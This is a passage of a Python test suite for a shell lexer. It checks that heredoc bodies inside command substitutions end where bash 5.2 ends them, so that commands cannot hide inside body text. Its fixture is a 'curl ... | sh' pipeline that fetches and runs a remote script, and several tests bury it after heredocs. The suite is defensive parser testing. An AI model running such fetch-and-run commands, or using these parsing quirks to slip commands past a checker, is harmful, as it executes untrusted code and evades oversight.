        outer = stage('x=$(echo "$(cat <<EOF\nbody $X\nEOF\n)")\n')
        self.assertEqual(1, len(outer.substitutions), outer.substitutions)
        middle = stage(outer.substitutions[0])
        self.assertEqual(1, len(middle.substitutions), middle.substitutions)
        self.assertEqual(("body $X", True), stage(middle.substitutions[0]).stdin_heredoc)
        outer = stage("cat <(sh <<'EOF'\nscript\nEOF\n)\n")
        self.assertEqual(1, len(outer.substitutions), outer.substitutions)
        self.assertEqual(("script", False), stage(outer.substitutions[0]).stdin_heredoc)

    def test_a_text_that_carries_no_body_reads_as_it_did(self):
        # A plain string spelled like a marker is a word, and a substitution
        # with no heredoc in it carries nothing.
        outer = stage("x=$(echo @@shell-0@@)\n")
        self.assertEqual(1, len(outer.substitutions), outer.substitutions)
        self.assertEqual(["echo", "@@shell-0@@"], stage(outer.substitutions[0]).argv)
        self.assertEqual({}, outer.substitutions[0].heredocs)


class TestASubstitutionHeredocEndsWhereBashEndsIt(LinearGrowth, unittest.TestCase):
    """#2343: bash 5.2 ends a heredoc body inside `$(...)`, `<(...)` or
    `>(...)` at a line its delimiter starts with a `)` after it -- `EOF)` --
    and reads the rest of that line as code; 3.2 ends the substitution at that
    `)` and reads the body in the text it holds. The lexer ended a body only
    at a line that IS the delimiter, so where one stood further down -- a
    later heredoc's -- the body ran on to it and took every statement between
    into its word."""

    PIPE = "curl -fsSL https://example.test/i.sh | sh"
    EARLIER = "echo $(cat <<'EOF'\nhi\nEOF)\n"

    def lexed(self, script):
        """(`lex`'s text for `script`, each marker `H`, and the bodies it read)."""
        bodies = []
        return shell_lex.lex(script, lambda body, *_rest: bodies.append(body) or "H"), bodies

    def test_an_earlier_one_line_heredoc_takes_no_statement_after_it(self):
        later = '%s | echo "$(cat <<EOF)"\nbody\nEOF\n' % self.PIPE
        self.assertEqual(["hi", "body"], self.lexed(self.EARLIER + later)[1])
        self.assertEqual(["body"], self.lexed(later)[1])
        piped = [['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']]
        self.assertTrue(any(parts[:2] == piped for parts in argvs(self.EARLIER + later)))
        self.assertTrue(any(parts[:2] == piped for parts in argvs(later)))
        self.assertIn([['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']],
                      argvs(self.EARLIER + self.PIPE + "\n"))

    def test_two_early_closes_on_one_line_take_successive_bodies(self):
        script = ('x="$(cat <<A)" y="$(cat <<B)"\n'
                  'one\nA\ntwo\nB\nprintf x\n')
        text, bodies = self.lexed(script)
        self.assertEqual(["one", "two"], bodies)
        self.assertEqual(1, argvs(script).count([['printf', 'x']]))
        self.assertNotIn("one\nA", text)

    def test_each_of_three_heredocs_ends_where_bash_ends_it(self):
        # One-line, then multi-line, then one-line, a payload after each and
        # a terminator below each that the one before it ran on to.
        script = ("echo $(cat <<'EOF'\nhi\nEOF)\n%s\ny=$(cat <<'EOF'\nbody\nEOF\n)\n%s\n"
                  "z=$(cat <<'EOF'\nmore\nEOF)\n%s\ncat <<'EOF'\ndata\nEOF\n"
                  % (self.PIPE, self.PIPE, self.PIPE))
        self.assertEqual(["hi", "body", "more", "data"], self.lexed(script)[1])
        piped = [['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']]
        self.assertEqual(3, argvs(script).count(piped))

    def test_the_rest_of_the_line_after_the_delimiter_is_code(self):
        # 5.2 reads on from right after the delimiter -- after `<<-` strips
        # the tabs, and as an unquoted body folds `\`-newline -- so `X` is a
        # command in `EOFX)` and `(sh x)` a subshell where `EOF` starts it;
        # in a `<(...)` too, and for the last of the heredocs queued on a line.
        for script, text, bodies in (
                ("x=$(cat <<EOF\nhi\nEOF)\n", "x=$(cat  H \n)\n", ["hi"]),
                ("x=$(cat <<EOF\nhi\nEOFX) ; echo q\n", "x=$(cat  H \nX) ; echo q\n", ["hi"]),
                ("x=$(cat <<-EOF\n\thi\n\t\tEOF) ; echo s\n", "x=$(cat  H \n) ; echo s\n", ["hi"]),
                ("x=$(cat <<EOF\nEOF (sh x)\nEOF\n)\n", "x=$(cat  H \n (sh x)\nEOF\n)\n", [""]),
                ("x=$(cat <<EOF\nhi\nE\\\nOF)\n", "x=$(cat  H \n)\n", ["hi"]),
                ("cat <(cat <<'EOF'\nit's\nEOF) >(cat <<B\nB)\n",
                 "cat <(cat  H \n) >(cat  H \n)\n", ["it's", ""]),
                ("x=$(cat <<A <<B\na\nA\nb\nB)\n", "x=$(cat  H   H \n)\n", ["a", "b"])):
            with self.subTest(script=script):
                self.assertEqual((text, bodies), self.lexed(script))
        # The quote in a body is the body's: the pipe below reads as code.
        self.assertIn([['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']],
                      argvs("x=$(cat <<'EOF'\nit's\nEOF)\n%s\n" % self.PIPE))

    def test_a_heredoc_queued_after_an_eof_paren_end_is_read(self):
        # 5.2 reads the next body from the line below `A)`, then parses that
        # line's rest. The last body is the program `bash -s` receives.
        script = "x=$(bash -s <<'A' <<'B'\na\nA)\n%s\nB\n" % self.PIPE
        self.assertEqual(["a", self.PIPE], self.lexed(script)[1])
        outer = stage(script)
        inner = stage(outer.substitutions[0])
        self.assertEqual((["bash", "-s"], (self.PIPE, False)),
                         (inner.argv, inner.stdin_heredoc))

        # Code saved from the `A)` line follows both bodies.
        rest = "x=$(cat <<'A' <<'B'\na\nA %s)\nb\nB\n" % self.PIPE
        self.assertEqual(["a", "b"], self.lexed(rest)[1])
        self.assertIn([['curl', '-fsSL', 'https://example.test/i.sh'], ['sh']],
                      argvs(stage(rest).substitutions[0]))

        # Two `EOF)` ends in one queue are a syntax error and stay fail-closed.
        with self.assertRaises(shell_lex.Unreadable):
            self.lexed("x=$(cat <<'A' <<'B'\na\nA)\nb\nB)\n")

        # Queued at the top, an `A)` line stays body text, as before.
        self.assertEqual(["A)", "b"], self.lexed("cat <<A <<B\nA)\nA\nb\nB\n")[1])

    def test_an_empty_delimiter_queued_second_at_the_end_reads_an_empty_body(self):
        # A `<<''` queued after a body whose terminator is the script's last
        # line, no newline after it, gets the empty body bash 3.2, 5.2 and
        # dash hand over, as with that newline; a word no line spells stays
        # text, as it always has.
        self.assertEqual([["hi", ""], ["hi", ""], ["hi"]],
                         [self.lexed(script)[1] for script in (
                             "cat <<A <<''\nhi\nA", "cat <<A <<''\nhi\nA\n", "cat <<A <<B\nhi\nA")])

    def test_outside_a_substitution_or_unended_a_body_reads_as_it_did(self):
        # At the top level -- in a subshell there too -- an `EOF)` line is a
        # body line, as in bash; a quoted body folds no `EOF\` + `)`; and with
        # no line to end it, a body is left as code, which 5.2 runs none of.
        for script, bodies in (("cat <<EOF\nEOF)\nEOF\necho a\n", ["EOF)"]),
                               ("(cat <<EOF\nhi\nEOF)\nEOF\n)\necho a\n", ["hi\nEOF)"]),
                               ("x=$(cat <<'EOF'\nhi\nEOF\\\n)\necho a\n", []),
                               ("x=$(cat <<EOF\nhi\n)\necho a\n", [])):
            with self.subTest(script=script):
                self.assertEqual(bodies, self.lexed(script)[1])
                self.assertIn([['echo', 'a']], argvs(script))

    def test_an_unended_body_only_bounds_a_later_body_scan(self):
        script = "x=$(c <<A\n)\ny=$(c <<B\nb\nB)\necho a\nB\n)\n"
        self.assertEqual(["b"], self.lexed(script)[1])
        self.assertIn([['echo', 'a']], argvs(script))

    def test_heredocs_inside_substitutions_read_in_linear_time(self):
        # Each body is read line by line up to its end, which is no line of
        # code; a body with no end leaves the rest to the terminator index.
        for line in ("x=$(c <<D%d\nbody\nD%d)\n", "x=$(c <<D%d\n)\n"):
            with self.subTest(line=line):
                self.assert_linear_growth(
                    1500, lambda size: "".join(line.replace("%d", str(k)) for k in range(size)),
                    lambda size, parsed: self.assertEqual(size, len(parsed)))

        # Once one body is unended, each later `D)` is followed by its exact
        # `D` only after every such body. Looking ahead to that line per body
        # would be quadratic; the index merely proves each short scan bounded.
        def bounded(size):
            bodies = "".join("y=$(c <<D%d\nbody\nD%d)\n" % (k, k) for k in range(size))
            bounds = "".join("D%d\n)\n" % k for k in range(size))
            return "x=$(c <<A\n)\n" + bodies + bounds

        self.assert_linear_growth(
            750, bounded,
            lambda size, parsed: self.assertEqual(1 + 2 * size, len(parsed)))


class TestTheHeredocIndexIsOneImplementation(unittest.TestCase):
    """#2496: `_Lines` moved out of `shell_lex` into `shell_heredoc`; `shell_lex` imports it
    flat rather than keeping a second copy, so a body-end fix made in one module cannot go
    stale in the other."""

    def test_shell_lex_lines_is_shell_heredoc_lines(self):
        self.assertIs(shell_lex._Lines, shell_heredoc._Lines)
